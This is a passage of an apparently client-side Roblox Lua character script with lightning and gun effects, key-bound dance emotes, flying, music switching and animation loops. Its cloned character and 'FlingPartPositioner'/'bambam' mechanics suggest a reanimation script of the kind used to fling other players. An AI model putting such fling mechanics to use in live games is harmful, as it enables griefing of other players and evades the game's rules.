						MOVESPEED = ((CFRAME.p - torvel).Magnitude/TIME)*BOOMR1
					else
						MOVESPEED = ((CFRAME.p - torvel).Magnitude/TIME)
					end
				end
				local GROWTH = nil
				if USEBOOMERANGMATH == true then
					GROWTH = (SIZE - ENDSIZE)*(BOOMR2+1)
				else
					GROWTH = (SIZE - ENDSIZE)
				end
				local TRANS = TRANSPARENCY - ENDTRANSPARENCY
				if TYPE == "Block" then
					EFFECT.CFrame = CFRAME*CFrame.Angles(math.rad(math.random(0,360)),math.rad(math.random(0,360)),math.rad(math.random(0,360)))
				else
					EFFECT.CFrame = CFRAME
				end
				if USEBOOMERANGMATH == true then
					for LOOP = 1,TIME+1 do
						swait()
						MSH.Scale = MSH.Scale - (Vector3.new((GROWTH.X)*((1 - (LOOP/TIME)*BOOMR2)),(GROWTH.Y)*((1 - (LOOP/TIME)*BOOMR2)),(GROWTH.Z)*((1 - (LOOP/TIME)*BOOMR2)))*BOOMR2)/TIME
						if TYPE == "Wave" then
							MSH.Offset = Vector3.new(0,0,-MSH.Scale.Z/8)
						end
						EFFECT.Transparency = EFFECT.Transparency - TRANS/TIME
						if TYPE == "Block" then
							EFFECT.CFrame = CFRAME*CFrame.Angles(math.rad(math.random(0,360)),math.rad(math.random(0,360)),math.rad(math.random(0,360)))
						else
							EFFECT.CFrame = EFFECT.CFrame*CFrame.Angles(math.rad(ROTATION1),math.rad(ROTATION2),math.rad(ROTATION3))
						end
						if torvel ~= nil then
							local ORI = EFFECT.Orientation
							EFFECT.CFrame = CFrame.new(EFFECT.Position,torvel)*CFrame.new(0,0,-(MOVESPEED)*((1 - (LOOP/TIME)*BOOMR1)))
							EFFECT.Orientation = ORI
						end
					end
				else
					for LOOP = 1,TIME+1 do
						swait()
						MSH.Scale = MSH.Scale - GROWTH/TIME
						if TYPE == "Wave" then
							MSH.Offset = Vector3.new(0,0,-MSH.Scale.Z/8)
						end
						EFFECT.Transparency = EFFECT.Transparency - TRANS/TIME
						if TYPE == "Block" then
							EFFECT.CFrame = CFRAME*CFrame.Angles(math.rad(math.random(0,360)),math.rad(math.random(0,360)),math.rad(math.random(0,360)))
						else
							EFFECT.CFrame = EFFECT.CFrame*CFrame.Angles(math.rad(ROTATION1),math.rad(ROTATION2),math.rad(ROTATION3))
						end
						if torvel ~= nil then
							local ORI = EFFECT.Orientation
							EFFECT.CFrame = CFrame.new(EFFECT.Position,torvel)*CFrame.new(0,0,-MOVESPEED)
							EFFECT.Orientation = ORI
						end
					end
				end
				EFFECT.Transparency = 1
			end
		end))
	end

	CamShake = function(Intensity)
		for i = 1,Intensity do
			swait()
			workspace.CurrentCamera.CFrame = workspace.CurrentCamera.CFrame * CFrame.Angles(math.rad(math.random(-Intensity,Intensity)),math.rad(math.random(-Intensity,Intensity)),math.rad(math.random(-Intensity,Intensity)))
			Intensity = Intensity - 1	
		end
	end
	local Lightning = function(startp,endp,amount,offst,Size)
		local FlingPartPositioner = Instance.new("Part")
		FlingPartPositioner.Anchored = true
		FlingPartPositioner.Transparency = 1
		FlingPartPositioner.CanCollide = false
		FlingPartPositioner.Size = Vector3.new(0,0,0)
		bambam.Parent = workspace

		local FakeBam = bambam:Clone()
		FakeBam.Parent = HumanRoot
		FakeBam.Location = FlingPartPositioner.Position
		HumanRoot.Velocity = Vector3.new(0,0,0)
		Effect({Time = math.random(25,50),EffectType = "Round Slash",Size = Vector3.new(),Size2 = Vector3.new(.1,0,.1),Transparency = 0,Transparency2 = 1,CFrame = CFrame.new(startp,Vector3.new(0,0,0))*CFrame.Angles(math.rad(math.random(0,360)),math.rad(math.random(0,360)),math.rad(math.random(0,360))),MoveToPos = nil,RotationX = math.random(-1,1),RotationY = math.random(-1,1),RotationZ = math.random(-1,1),Material = "Neon",Color = Color3.new(1, 1, 1),SoundID = nil,SoundPitch = nil,SoundVolume = nil,UseBoomerangMath = true,Boomerang = 0,SizeBoomerang = 15})
		local f = coroutine.create(function()
			local ptab = {}
			for i = 0,amount do
				local offset = Vector3.new(math.random(-offst,offst),math.random(-0,offst),math.random(-offst,offst))
				if i == 0 or i == amount then
					offset = Vector3.new(0,0,0)
				end
				local pos = startp + (endp - startp).Unit * i * (endp - startp).Magnitude / amount + offset
				ptab[#ptab + 1] = pos + offset
			end
			for i = 1, #ptab do
				if ptab[i + 1] ~= nil then
					if i > 100 then
						break
					end

					local lght = Instance.new("Part")
					lght.Material = "Neon"
					lght.CanCollide = false
					lght.Anchored = true
					lght.Size = Vector3.new(Size,Size,(ptab[i] - ptab[i + 1]).Magnitude)
					lght.CFrame = CFrame.new((ptab[i] + ptab[i + 1])/2, ptab[i + 1])
					local twn = MakeTween(0.5,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false)
					local ST = lght.Position
					local ltwn = TweenService:Create(lght, twn,{Size = Vector3.new(0,0,lght.Size.Z)})
					lght.Parent = CloneChar
					ltwn:Play()
					game.Debris:AddItem(lght,0.5)
					lght.Color = Color3.new(1, 1, 1)
					if i == #ptab-1 then
						local SP = Instance.new("Part")
						SP.CanCollide = false
						SP.Anchored = true
						SP.Parent = workspace
						SP.Size = Vector3.new(0,0,0)
						SP.Position = lght.Position
						game.Debris:AddItem(SP,10)
					end
				else
					makesound("rbxassetid://3787180659",1,3,workspace,99999999,99999999):Play()
					lIT = true
					Effect({Time = math.random(25,50),EffectType = "Round Slash",Size = Vector3.new(),Size2 = Vector3.new(.1,0,.1),Transparency = 0,Transparency2 = 1,CFrame = CFrame.new(endp,Vector3.new(0,0,0))*CFrame.Angles(math.rad(math.random(0,360)),math.rad(math.random(0,360)),math.rad(math.random(0,360))),MoveToPos = nil,RotationX = math.random(-1,1),RotationY = math.random(-1,1),RotationZ = math.random(-1,1),Material = "Neon",Color = Color3.new(1, 1, 1),SoundID = nil,SoundPitch = nil,SoundVolume = nil,UseBoomerangMath = true,Boomerang = 0,SizeBoomerang = 15})
					Effect({Time = math.random(25,50),EffectType = "Round Slash",Size = Vector3.new(),Size2 = Vector3.new(.1,0,.1),Transparency = 0,Transparency2 = 1,CFrame = CFrame.new(endp,Vector3.new(0,0,0))*CFrame.Angles(math.rad(math.random(0,360)),math.rad(math.random(0,360)),math.rad(math.random(0,360))),MoveToPos = nil,RotationX = math.random(-1,1),RotationY = math.random(-1,1),RotationZ = math.random(-1,1),Material = "Neon",Color = Color3.new(1, 1, 1),SoundID = nil,SoundPitch = nil,SoundVolume = nil,UseBoomerangMath = true,Boomerang = 0,SizeBoomerang = 5})
					FakeBam.Location = endp				
					HumanRoot.Position = endp

					wait(0.5)
					FakeBam:Destroy()
					bambam.Parent = HumanRoot
					lIT = false				
					break
				end
			end
		end)
		coroutine.resume(f)
	end

	makesound = function(soundid,speed,volume,parent,Max,Min)
		local sound = Instance.new("Sound")
		sound.SoundId = soundid
		sound.RollOffMaxDistance = Max
		sound.RollOffMinDistance = Min
		sound.PlaybackSpeed =speed 
		sound.Volume = volume
		sound.Parent = parent
		repeat
			wait()
		until sound.Loaded
		sound:Play()
		spawn(function()
			sound.Played:wait()
			sound:Destroy()
		end)
		return sound
	end
	local Shoot = function(Position)
		if Attacking == false then
			Attacking = true
			turnto(Position)
			for i =1,12 do
				swait()
				RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root *CF(0,0,2 + math.sin(time()/4.7)*-1) * CFA(0,0,math.rad(20)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
				tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,0,0) * CFA(math.rad(20),math.rad(0),math.rad(112)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
				tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(math.rad(-12),0,math.rad(0)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
				tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0.43,0.4,0.1) * CFA(0,math.rad(-16),math.rad(-12)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
				tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(-0.45,0.41,0.13)  * CFA(0,math.rad(19),math.rad(24)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
			end
			makesound("rbxassetid://642890855",1,10,workspace,999999,999999):Play()

			for i =1,2 do
				Lightning(GunTip.WorldPosition,Position, math.floor((RootPart.Position - Position).Magnitude/10),3 ,1.6)
			end

			Attacking = false
		end
	end
	local Mouse = game.Players.LocalPlayer:GetMouse()
	turnto = function(position)
		CloneChar.HumanoidRootPart.CFrame=CFrame.new(CloneChar.HumanoidRootPart.CFrame.p,Vector3.new(position.X,CloneChar.HumanoidRootPart.Position.Y,position.Z)) * CFrame.new(0, 0, 0)
	end

	local Favin = false
	local function Fave()
		if Attacking == false and Favin == false then
			local SonkId = Song.SoundId
			local SongPos = Song.TimePosition
			Song.SoundId = "rbxassetid://3663868508"
			Song.TimePosition = 0
			Attacking = true -- this is a secret butterloaf, pssst don't tell anyone
			Favin = true
			while Favin == true do
				swait()
				neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(0,0,0),LerpStyle(0.2,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut))
				RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(-2.1855674603444e-08,0.010108964517713,0.78739899396896) * CFA(math.rad(-131.10086391052),math.rad(-3.053332494205e-12),math.rad(1.0177774980683e-12)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(2.1855695919726e-08,3.5762786865234e-06,4.887580871582e-06) * CFA(math.rad(-21.179310125564),math.rad(3.3981629021395e-16),math.rad(-1.017771734963e-13)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
			end
			Song.SoundId = SonkId
			Song.TimePosition = SongPos
			Attacking = false
		elseif Favin == true then
			Favin = false
		end
	end
	local Krumpin = false
	local function Krump()
		if Attacking == false and Krumpin == false then
			local SonkId = Song.SoundId
			local SongPos = Song.TimePosition
			Song.SoundId = "rbxassetid://1511734302"
			Song.TimePosition = 0
			Attacking = true
			Krumpin = true
			while Krumpin == true do
				swait()
				neck.C1 = neck.C1:Lerp(nek * CF(1.3299286365509e-05,1.564621925354e-06,-3.400444984436e-05) * CFA(math.rad(20.667670900122),math.rad(9.5095895653651),math.rad(-8.2238620243317e-06)),LerpStyle(0.2,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut))
				RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(math.cos(time()*16)*2,math.sin(time()*16)*2,0) * CFA(math.rad(0),math.rad(-19.867958201151),math.rad(0)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(2.1855699472439e-08,-0.14256793260574,0.2752740085125) * CFA(math.rad(-62.619406537109),math.rad(4.0711099922733e-13),math.rad(-1.0177774010055e-12)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(4.5754510210827e-05,0.43283951282501,0.43122187256813) * CFA(math.rad(-106.56103241141),math.rad(1.3473487910765e-12),math.rad(0.14999999883804)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(-2.1855750986788e-08,1.0132789611816e-06,-5.4836273193359e-06) * CFA(math.rad(-72.103404237427),math.rad(-1.8151092059242e-12),math.rad(2.4552430081022e-12)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(2.1855672827087e-08,-0.62612974643707,0.13251002132893) * CFA(math.rad(-11.94899504253),math.rad(-2.442665995364e-12),math.rad(-5.0888871870203e-14)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
			end
			Song.SoundId = SonkId
			Song.TimePosition = SongPos
			Attacking = false
		elseif Krumpin == true then
			Krumpin = false
		end
	end
	local Koichi = false
	local function Koichii()
		if Attacking == false and Koichi == false then
			local SonkId = Song.SoundId
			local SongPos = Song.TimePosition
			Song.SoundId = "rbxassetid://5808893495"
			Song.TimePosition = 0
			Attacking = true
			Koichi = true
			while Koichi == true do
				swait()
				neck.C1 = neck.C1:Lerp(nek * CF(-2.9951333999634e-05,-6.0386955738068e-05,-9.0897083282471e-06) * CFA(math.rad(9.1218807073185),math.rad(8.8078149489029),math.rad(8.937400712931)),LerpStyle(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut))
				RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(-2.2902454581924),math.rad(0),math.rad(0)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(-4.7236680984497e-05,-1.6763806343079e-06,-1.5497207641602e-06) * CFA(math.rad(-3.0976088228074),math.rad(-12.280956750344),math.rad(75.694874797371)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(9.2729926109314e-05,-1.7285346984863e-06,-9.3579292297363e-05) * CFA(math.rad(-12.447243682104),math.rad(0.027385403353328),math.rad(17.539893345194)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(-0.052849780768156,-0.10625036805868,-0.017882097512484) * CFA(math.rad(0.0067841550123529),math.rad(-18.689038522103),math.rad(-27.683516564607)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(-0.23080363869667,0.065746814012527,2.7001156922779e-05) * CFA(math.rad(1.8219082326296e-06),math.rad(0.016866024907329),math.rad(-15.898264208371)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
			end
			Song.SoundId = SonkId
			Song.TimePosition = SongPos
			Attacking = false
		elseif Koichi == true then
			Koichi = false
		end
	end

	local SPEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEN = false
	local function SPEEN()
		if Attacking == false and SPEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEN == false then
			local SonkId = Song.SoundId
			local SongPos = Song.TimePosition
			Song.SoundId = "rbxassetid://6414267245"
			Song.TimePosition = 0
			Attacking = true
			SPEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEN = true
			local SPEEV = 1
			while SPEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEN == true do
				swait()
				SPEEV = SPEEV + 20
				neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut))
				RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(SPEEV),math.rad(0),math.rad(0)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(math.sin(time()*10)*50)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(math.sin(time()*10)*50)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(math.sin(time()*10)*50)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(math.sin(time()*10)*50)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
			end
			Song.SoundId = SonkId
			Song.TimePosition = SongPos
			Attacking = false
		elseif SPEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEN == true then
			SPEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEN = false
		end
	end





	local LightningBeam = function()
		if Attacking == false then
			Attacking = true
			local main = makesound("rbxassetid://138677306",1,5,GUNMODEL,99999,99999)
			makesound("rbxassetid://415700134",1,5,GUNMODEL,99999,99999)
			spawn(function()
				while main.Playing == true do
					Lightning(GunTip.WorldPosition,Mouse.Hit.Position, math.floor((RootPart.Position - Mouse.Hit.Position).Magnitude/10),3 ,1.6)
					wait(0.1)
				end
			end)
			lIT = true
			while main.Playing == true do
				turnto(Mouse.Hit.Position)
				swait()
				neck.C1 = neck.C1:Lerp(nek * CF(-0.034845352172852,-0.24354274570942,0.14308270812035) * CFA(math.rad(19.374567533624),math.rad(-20.783217210311),math.rad(-3.4268335457555)),LerpStyle(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut))
				RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0.82000035047531) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(-9.9241733551025e-06,-1.5255063772202e-06,5.9604644775391e-08) * CFA(math.rad(-1.628444191035e-12),math.rad(-8.7783309208393e-13),math.rad(86.486689799207)),LerpStyle(0.4,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(-0.4830057322979,-0.081065863370895,-0.93329334259033) * CFA(math.rad(-5.6764622168313),math.rad(-48.113546400484),math.rad(-90.653767721264)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0.42104256153107,0.034831158816814,0.17949678003788) * CFA(math.rad(-0.61160128510086),math.rad(-12.918175833866),math.rad(-13.875242430936)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0.044364839792252,0.16831062734127,-0.01743184030056) * CFA(math.rad(-3.0618461657566),math.rad(10.748240102479),math.rad(16.00414238579)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
			end
			lIT = false
			Attacking = false
		end
	end







	Weld15.Part0 = CloneChar["Right Arm"]
	local B1Hold = false
	Mouse.Button1Down:Connect(function()
		B1Hold = true 
		while B1Hold == true do
			wait()
			Shoot(Mouse.Hit.Position)
			print("lmao")
		end
	end)
	local Running = false
	Mouse.Button1Up:Connect(function()
		B1Hold = false
	end)
	Flying = false
	Mouse.KeyDown:Connect(function(key)
		if key == "f" then
			if Flying == false then
				Flying = true
				RootPart.Anchored = true
				while Flying == true do
					swait()
					local FW = game.Players.LocalPlayer.Character.Humanoid.MoveDirection
					if FW.Magnitude > 0 then
						RootPart.CFrame = RootPart.CFrame:Lerp(CF(RootPart.Position + Vector3.new(FW.X,workspace.CurrentCamera.CFrame.LookVector.Y,FW.Z)*5*FW.Magnitude,RootPart.Position+Vector3.new(FW.X*50,0,FW.Z*50)),0.3)

					else
						RootPart.CFrame = RootPart.CFrame
					end

				end
			else
				Flying = false
				RootPart.Anchored = false
			end
		elseif key == "m"  then -- WAIT 3D MATRIXX NOOOOOOOOOOOOOOO
			Song.TimePosition = 0
			if Mode ~= 6 then
				Mode = Mode + 1
				if Mode == 2 then
					Song.SoundId = "rbxassetid://1289239698" 
				elseif Mode == 3 then
					Song.SoundId = "rbxassetid://5341713393"
				elseif Mode == 4 then
					Song.SoundId = "rbxassetid://2651180850"
				elseif Mode == 5 then
					Song.SoundId = "rbxassetid://3269680589"
				elseif Mode == 6 then
					Song.SoundId = "rbxassetid://6313794194"
				end
			else
				Mode = 1
				Song.SoundId = SongID
			end
		elseif key == "z" then
			LightningBeam()
		elseif key == "r" then
			Fave()
		elseif key == "t" then
			Krump()
		elseif key == 'y' then
			Koichii()
		elseif key == "u" then
			SPEEN()
		end
	end)
	local RLA = CFrame.new(0,0,0)

	local Anim = "Idle"

	Humanoid.WalkSpeed = 50
	if HatLoad == true then
		fly()	
	end


	local AmongDripV = 0
	GUNMODEL.Handle.Anchored = false
	GunWeld.Part0 = CloneChar["Right Arm"]

	chat("REEEEE")

	LoadingGui:Destroy()
	while true do
		if AudioReplication == true then
			ReplicationBoombox.Parent = Player.Character
		end
		if Song.PlaybackLoudness > AmongDripV then
			AmongDripV = Song.PlaybackLoudness
		end
		local SusVISUALIZER = 40*(Song.PlaybackLoudness/AmongDripV)
		swait()
		if lIT == false then
			HumanRoot.Position = CloneChar.Torso.Position
			bambam.Location = CloneChar.HumanoidRootPart.Position	
		else

		end
		torvel = game.Players.LocalPlayer.Character.Humanoid.MoveDirection.Magnitude
		if torvel < 0.1 then
			Anim = "Idle"
		elseif torvel > 0.1  then
			Anim = "Walking"
		end
		if Attacking == false then
			if Mode == 1 then
				if Anim == "Idle" then
					neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(0,0,0),LerpStyle(0.2,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut))
					RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(math.cos(time()*1.2)*0.3,0,1.5699999332428 + math.sin(time()*1.2)*0.3) * CFA(math.rad(4.1860180366257),0,0),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
					tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0.18456310033798,0.072837918996811,0.025131464004517) * CFA(math.rad(6.0060487263621+4-math.cos(time()*1.2)*4),math.rad(-13.401729321441),math.rad(148.57302056216-7+math.sin(time()*1.2)*7)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
					tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(-2.1855694143369e-08,-1.1324882507324e-06,4.7683715820313e-07) * CFA(math.rad(-10.555062715957),0,math.rad(5.0888871870203e-14-4+math.sin(time()*1.2)*7)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
					tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0.53557544946671,0.51078402996063,0.20069018006325) * CFA(math.rad(-0.61152860761922),math.rad(-12.917748947043-7+math.cos(time()*1.2)*7),math.rad(-13.874821520528-12+math.sin(time()*1.2)*12)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
					tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0.044364839792252,0.16831062734127,-0.01743184030056) * CFA(math.rad(-3.0618461657566+3-math.cos(time()*1.2)*3),math.rad(10.748240102479-8+math.sin(time()*1.2)*8),math.rad(16.00414238579-6+math.sin(time()*1.2)*6)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				elseif Anim == "Walking" then
					neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(0,0,0),LerpStyle(0.2,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut))
					RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(math.cos(time()*1.2)*0.3,0,1.5699999332428 + math.sin(time()*1.2)*0.2) * CFA(math.rad(20),0,0),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
					tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0.18456310033798,0.072837918996811,0.025131464004517) * CFA(math.rad(0),math.rad(0),math.rad(-90 + 20)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
					tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(-2.1855694143369e-08,-1.1324882507324e-06,4.7683715820313e-07) * CFA(math.rad(-10.555062715957),0,math.rad(5.0888871870203e-14+5)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
					tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0.53557544946671,0.51078402996063,0.20069018006325) * CFA(math.rad(-0.61152860761922),math.rad(-12.917748947043-7+math.cos(time()*1.2)*7),math.rad(-13.874821520528-12+math.sin(time()*1.2)*12)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
					tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0.044364839792252,0.16831062734127,-0.01743184030056) * CFA(math.rad(-3.0618461657566+3-math.cos(time()*1.2)*3),math.rad(10.748240102479-8+math.sin(time()*1.2)*8),math.rad(16.00414238579-6+math.sin(time()*1.2)*6)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				end
			else
				if Mode == 2 then
					if Anim == "Idle" then
						neck.C1 = neck.C1:Lerp(nek * CF(-0.035,-0.244,0.143) * CFA(math.rad(40.986848473317),math.rad(-7.6134581885569),math.rad(0.59234356673601)) * CFA(math.rad(math.random(-5,5)),math.rad(math.random(-5,5)),math.rad(math.random(-5,5))),LerpStyle(1,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut))
						RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(math.cos(time()*1.2/2)*0.5,0,1.5699999332428 + math.sin(time()*1.2)*0.8) * CFA(math.rad(4.1860180366257),0,0) * CFA(math.rad(math.random(-5,5)),math.rad(math.random(-5,5)),math.rad(math.random(-5,5))),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
